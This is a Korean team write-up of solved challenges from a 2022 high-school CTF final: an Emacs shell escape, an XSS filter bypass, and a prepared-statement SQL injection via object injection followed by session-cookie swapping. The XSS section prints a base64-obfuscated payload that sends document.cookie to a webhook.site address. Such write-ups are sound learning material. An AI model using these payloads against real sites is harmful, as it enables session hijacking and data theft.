# 2022 Cyber-Guardians CTF Final

## Dreamhack Profile
School: 덕영고등학교

Team: Asseertive

## Solve list
A - Sanity Check Revenge (@suk-6)

D - xss-1.3 (@suk-6)

E - CProxy: Inject (@fixca)

K - Simple Factor (@suk-6)

M - xss-1.5 (@suk-6)

## Sanity Check Revenge
문제 ssh에 접속하면 GNU Emacs 편집기가 나온다.

ESC + !로 Shell Command 입력창을 불러와서 루트 폴더의 flag 파일을 읽는다.

## xss-1.3
xss-1.3은 문제에서 말하고 있듯 xss 문제이다.

`'`, `"`, `=`를 필터링하고 있다.

필터링을 우회하기 위해 Base64 인코딩으로 해결하였다.

```
<svg/onload=location.href=`https://webhook.site/webhook-id?flag=`.concat(document.cookie)>

to base64(URL-safe) + JS Decoding Code

<script>document.write(atob(`PHN2Zy9vbmxvYWQ9bG9jYXRpb24uaHJlZj1gaHR0cHM6Ly93ZWJob29rLnNpdGUvd2ViaG9vay1pZD9mbGFnPWAuY29uY2F0KGRvY3VtZW50LmNvb2tpZSk-`))</script>
```

## CProxy: Inject
### 1. admin_inject 로 로그인 해보자!
허나 이 작업은 좀 어려웠어요.   

왜냐하면 preparedstatement 기법이어서 "나 ' or 1 = 1 같은 sqli가 먹히기 힘든 구조였어요.   

하지만 preparedstatement 에서도 먹히는 SQLi 가 있다는 것을   

https://core-research-team.github.io/2020-10-01/Expressjs

이 글에서 알게 되었어요.   

즉 pw 안에 다른 object를 넣는 방법을 알게되었고 그 방법은 다음과 같습니다.   

![pwinject](./img/pwinject.png)

이제 여기서 얻은 connect sid를 브라우저로 옮겨주는 작업을 했어요.   

미리 아무계정으로 로그인 해둔 페이지에서 쿠키를 슬쩍 바꿔주면 admin_inject 계정으로 속이기 성공!   

![change_cookie](./img/change_cookie.png)

### 2. 플래그를 따보자!
플래그의 위치는 response 테이블에 있었어요.   

db.js 파일에서 response 테이블에 있는 데이터를 불러올 수 있는 함수가 있었고, 그 함수는 /api/history 엔드포인트에 있다는것을 알게 되었어요.

![dbjsresponse](./img/dbjsresponse.png)   

그리고 이 함수는 여기있는 엔드포인트에서 실행되었어요.

![history_endpoint](./img/history_endpoint.png)   

이거 실행 시키면 되겠지 하고 실행했더니

![get_faked](./img/get_faked.png)

아이고 맙소사 플래그가 안나오는 함수를 실행 시켰어요.   

하지만 response 테이블을 참조해서 데이터를 불러오는 엔드포인트랑 함수는 하나 더 있었어요.   

![actual_function](./img/actual_function.png)

![actual_endpoint](./img/actual_endpoint.png)

그럼 /api/history/ 뒤에 rid의 값을 입력하면 그 특정 데이터를 전부 불러올 수 있으니 실행했고,   

결과는 다음과 같았어요.   

![success_flag](./img/success_flag.png)

## Simple Factor

## xss-1.5